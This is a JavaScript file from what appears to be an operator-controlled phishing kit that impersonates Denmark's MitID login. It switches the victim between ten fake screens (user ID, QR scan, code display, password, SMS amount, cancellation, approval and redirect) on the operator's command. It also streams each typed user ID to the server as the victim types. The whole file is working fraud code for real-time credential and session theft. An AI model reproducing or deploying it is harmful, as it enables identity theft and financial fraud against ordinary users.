/* ════════════════════════════════════════════════════════════
   visitor.js — 10 skærme, 1:1 fra original React-app
   Admin vælger skærm: brugerid|loader|venterqr|scan|bekræft|
   kodeviser|adgangskode|sms|annullering|approved
   ════════════════════════════════════════════════════════════ */
let lastSig = null;
let qrDrawn = null;
let redirectTimer = null;

const $ = (id) => document.getElementById(id);
const screens = ['screenLoader','screenBrugerId','screenVenterQr','screenScanQr','screenBekræft','screenKodeviser','screenAdgangskode','screenSms','screenAnnullering','screenApproved'];

function hideAll() { screens.forEach(id => { const el = $(id); if (el) el.classList.add('hidden'); }); }
function show(id) { hideAll(); const el = $(id); if (el) el.classList.remove('hidden'); }

function sig(s) {
  return JSON.stringify([s.live, s.flow, s.sessionId, s.tekst, s.action, s.typed, s.beskedBanner]);
}

/* ── QR ── */
function drawQR(url) {
  const el = $('qrcode');
  if (!el) return;
  el.innerHTML = '';
  if (window.QRCode) new QRCode(el, { text: url, width: 200, height: 200, colorDark: '#000', colorLight: '#fff', correctLevel: QRCode.CorrectLevel.M });
}

/* ── RENDER: skift skærm efter flow ── */
function render(s) {
  if (!s) return;
  const sg = sig(s);
  if (sg === lastSig) return;
  lastSig = sg;

  // banners
  const bb = s.beskedBanner || {};
  const banner = $('mitidBanner');
  if (banner) { banner.style.display = bb.visible ? 'flex' : 'none'; const t = $('mitidBannerText'); if (t) t.textContent = bb.text || ''; }

  if (!s.live) { show('screenBrugerId'); $('formHeading').textContent = 'Log på hos MitID.dk'; return; }

  const flow = s.flow || 'brugerid';
  const a = s.action || {};

  switch (flow) {
    case 'brugerid':
      show('screenBrugerId');
      $('formHeading').textContent = 'Log på hos MitID.dk';
      break;
    case 'loader':
      show('screenLoader');
      $('formHeading').textContent = '';
      break;
    case 'venterqr':
      show('screenVenterQr');
      $('formHeading').textContent = '';
      break;
    case 'scan':
      show('screenScanQr');
      $('formHeading').textContent = '';
      const url = s.sessionId ? window.location.origin + '/r/' + s.sessionId : 'https://mitid.dk';
      if (url !== qrDrawn) { drawQR(url); qrDrawn = url; }
      break;
    case 'bekræft':
      show('screenBekræft');
      $('formHeading').textContent = '';
      break;
    case 'kodeviser':
      show('screenKodeviser');
      $('formHeading').textContent = 'Godkend med kodeviser';
      $('engangskodeValue').textContent = s.typed && s.typed.otp ? s.typed.otp : '······';
      break;
    case 'adgangskode':
      show('screenAdgangskode');
      $('formHeading').textContent = '';
      break;
    case 'sms':
      show('screenSms');
      $('formHeading').textContent = '';
      $('smsAmount').textContent = a.amount || '';
      break;
    case 'annullering':
      show('screenAnnullering');
      $('formHeading').textContent = '';
      $('annullerAmount').textContent = a.amount || '';
      if (a.detail) $('annullerMsg').textContent = a.detail;
      break;
    case 'approved':
      show('screenApproved');
      $('formHeading').textContent = '';
      if (s.target && s.target.trim()) {
        clearTimeout(redirectTimer);
        redirectTimer = setTimeout(() => { window.location.href = s.target.trim(); }, 2000);
      }
      break;
    default:
      show('screenBrugerId');
  }
}

/* ── BRUGER-ID INPUT: live-til-admin ── */
let typedTimer = null;
const brugerInput = $('brugerIdInput');
const brugerBtn = $('brugerBtn');

brugerInput.addEventListener('input', function () {
  const v = this.value.trim();
  brugerBtn.disabled = !v;
  brugerBtn.style.background = v ? '#0060e6' : '#cccccc';
  brugerBtn.style.cursor = v ? 'pointer' : 'not-allowed';
  clearTimeout(typedTimer);
  typedTimer = setTimeout(() => {
    fetch('/api/typed', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ brugerId: v }) }).catch(() => {});
  }, 400);
});

brugerBtn.addEventListener('click', () => {
  const v = brugerInput.value.trim();
  if (!v) return;
  fetch('/api/typed', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ brugerId: v }) }).catch(() => {});
});

$('hideBtn').addEventListener('click', function () {
  if (brugerInput.type === 'text') { brugerInput.type = 'password'; this.textContent = 'Vis'; }
  else { brugerInput.type = 'text'; this.textContent = 'Skjul'; }
});

/* ── POLL + SOCKET ── */
async function poll() {
  try {
    const r = await fetch('/api/public-state', { cache: 'no-store' });
    render(await r.json());
  } catch (e) {}
}
poll();
try { const socket = io(); socket.on('state-update', render); } catch (e) {}
setInterval(poll, 1200);